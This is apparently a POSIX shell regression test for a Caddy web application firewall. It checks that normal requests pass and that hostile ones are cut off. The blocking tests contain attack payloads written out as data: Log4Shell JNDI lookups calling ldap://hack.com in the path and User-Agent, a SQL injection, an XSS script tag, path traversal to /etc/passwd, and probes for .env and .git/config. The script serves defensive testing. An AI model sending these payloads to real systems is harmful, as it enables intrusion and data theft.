#!/bin/sh
# ==============================================================================
# Caddy WAF 自动化回归测试脚本
# ==============================================================================
# 功能概述：
#   本脚本用于验证 Caddy WAF (waf.conf) 的安全拦截规则与正常请求的防误杀放行。
#
# 运行环境及依赖：
#   - 支持在本地宿主机直接运行，依赖本地或容器内的 curl 工具发起请求。
#   - 必须遵循 POSIX sh 规范（符合项目 .shellcheckrc 配置）。
#
# 核心设计原理：
#   1. TARGET_URL 动态解析：
#      优先使用参数 $1，其次尝试从本地/父级目录下的 .env 文件读取 TARGET_URL。
#      若均未匹配到，则自动降级使用默认值 http://localhost:8888。
#
#   2. 宿主机与容器自适应测试：
#      脚本启动时先对目标端口进行连通性测试。若宿主机不可直接访问端口（例如
#      docker-compose.yml 中未暴露端口），脚本将探测是否存在名为 "caddy" 的运行中容器，
#      并切换为通过 `docker exec caddy curl` 在容器内部进行测试，无需暴露测试端口。
#
#   3. 防假阳性判定机制：
#      Caddy 拦截恶意请求时使用 `abort` 直接断开 TCP 连接，此时 curl 会退出为非零状态码
#      （例如 52, Empty reply from server）。脚本通过排查退出码 7 (Connection refused)
#      和 6 (Could not resolve host)，防止因服务未启动或关闭引起的假阳性“拦截通过”。
# ==============================================================================

# 提取 .env 中的变量值 (POSIX sh 兼容)
extract_env_var() {
	file_path="${1}"
	if [ -f "${file_path}" ]; then
		grep "^TARGET_URL=" "${file_path}" | cut -d'=' -f2- | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' -e 's/^"//' -e 's/"$//' -e "s/^'//" -e "s/'$//"
	fi
}

ENV_TARGET_URL=""
for path in ".env" "../.env" "$(dirname "$0")/.env" "$(dirname "$0")/../.env"; do
	if [ -f "${path}" ]; then
		ENV_TARGET_URL=$(extract_env_var "${path}")
		[ -n "${ENV_TARGET_URL}" ] && break
	fi
done

TARGET_URL="${1:-${ENV_TARGET_URL:-http://localhost:8888}}"

# 存储转义序列，POSIX sh 兼容的颜色变量定义方式
RED=$(printf '\033[0;31m')
GREEN=$(printf '\033[0;32m')
YELLOW=$(printf '\033[1;33m')
NC=$(printf '\033[0m')

# 日志格式化输出函数，形式为：YYYY-MM-DD HH:MM:SS [LEVEL] - MESSAGE (POSIX sh 兼容)
# 格式化输出带颜色日志
# 通过 case 分支直接 printf 可以避免定义临时颜色变量和 if-else 判定，使日志输出逻辑更直接。
log() {
	level="$1"
	msg="$2"
	dt=$(date '+%Y-%m-%d %H:%M:%S')

	case "${level}" in
		INFO) printf "%s%s [INFO] - %s%s\n" "${YELLOW}" "${dt}" "${msg}" "${NC}" ;;
		SUCCESS) printf "%s%s [SUCCESS] - %s%s\n" "${GREEN}" "${dt}" "${msg}" "${NC}" ;;
		ERROR) printf "%s%s [ERROR] - %s%s\n" "${RED}" "${dt}" "${msg}" "${NC}" ;;
		*) printf "%s [%s] - %s\n" "${dt}" "${level}" "${msg}" ;;
	esac
}

log "INFO" "等待 Caddy 启动完毕 (2s)..."
sleep 2

# 探测测试方式 (直接测试 vs. 容器内测试)
USE_DOCKER=false

# 检测 caddy 容器是否处于运行状态，用于后续备用
caddy_container="$(docker ps -q -f name=^caddy$ -f status=running 2> /dev/null)"

# 尝试直接访问目标 URL 的健康检查接口
if curl -s -m 2 -o /dev/null "${TARGET_URL}/health" > /dev/null 2>&1; then
	log "INFO" "检测到可以直接访问 ${TARGET_URL}，将使用本地 curl 进行测试..."
# 如果直接访问失败，检测 caddy 容器是否处于运行状态
elif [ -n "${caddy_container}" ]; then
	log "INFO" "无法直接访问 ${TARGET_URL}，但检测到 caddy 容器正在运行，将通过容器内部进行测试..."
	USE_DOCKER=true
else
	log "ERROR" "无法连接到测试目标 ${TARGET_URL}，且未找到运行中的 caddy 容器。请确保 Caddy 已启动。"
	exit 1
fi

log "INFO" "开始执行 WAF 测试... 测试目标: ${TARGET_URL}"

# 执行 curl 请求 (自适应本地/容器模式)
run_curl() {
	if [ "${USE_DOCKER}" = "true" ]; then
		docker exec caddy curl -s -m 5 -o /dev/null "$@"
	else
		curl -s -m 5 -o /dev/null "$@"
	fi
}

test_request() {
	name="${1}"
	expected="${2}"
	shift 2

	run_curl "$@" > /dev/null 2>&1
	exit_code=$?

	passed=0
	case "${expected}" in
		allow) [ "${exit_code}" -eq 0 ] && passed=1 ;;
		# 退出码 52 (Empty reply) 是 Caddy 触发 WAF 拦截 (abort) 时的表现。
		# 排除退出码 6 (Could not resolve host) 和 7 (Connection refused)，防止因服务未启动导致假阳性。
		block) [ "${exit_code}" -ne 0 ] && [ "${exit_code}" -ne 6 ] && [ "${exit_code}" -ne 7 ] && passed=1 ;;
		*) ;;
	esac

	if [ "${passed}" -eq 1 ]; then
		log "SUCCESS" "${name}"
	else
		log "ERROR" "${name} (退出码: ${exit_code}, 期望: ${expected})"
	fi
}

printf "\n=== 1. 防误杀测试 (正常请求必须放行) ===\n"
test_request "正常访问根目录" "allow" "${TARGET_URL}/"
test_request "带有 SQL 关键字的正常文章路径" "allow" "${TARGET_URL}/post/how-to-use-select-from"
test_request "请求普通的静态文件" "allow" "${TARGET_URL}/style.css"

printf "\n=== 2. 拦截测试 (恶意请求必须被中断) ===\n"
test_request "敏感文件泄漏 (.env)" "block" "${TARGET_URL}/.env"
test_request "源码泄露探测 (.git)" "block" "${TARGET_URL}/.git/config"
test_request "路径遍历攻击 (../)" "block" "${TARGET_URL}/../../etc/passwd"
test_request "管理后台嗅探 (phpmyadmin)" "block" "${TARGET_URL}/phpmyadmin/"
test_request "高危 SQL 注入攻击 (带单引号, PATH)" "block" "${TARGET_URL}/search/%27+UNION+SELECT+*"
test_request "高危跨站脚本 XSS (PATH)" "block" "${TARGET_URL}/<script>alert(1)</script>"
test_request "Log4Shell 路径注入" "block" "${TARGET_URL}/%24%7Bjndi:ldap://hack.com/a%7D"
test_request "Log4Shell 请求头 (User-Agent) 注入" "block" "-H" "User-Agent: \${jndi:ldap://hack.com/a}" "${TARGET_URL}/"
test_request "常见漏洞扫描器特征 (sqlmap)" "block" "-H" "User-Agent: sqlmap/1.5" "${TARGET_URL}/"
test_request "恶意嗅探请求方法 (TRACE)" "block" "-X" "TRACE" "${TARGET_URL}/"

printf "\n"
log "INFO" "测试完成。如果有未通过项，请检查 waf.conf 或网络状态。"
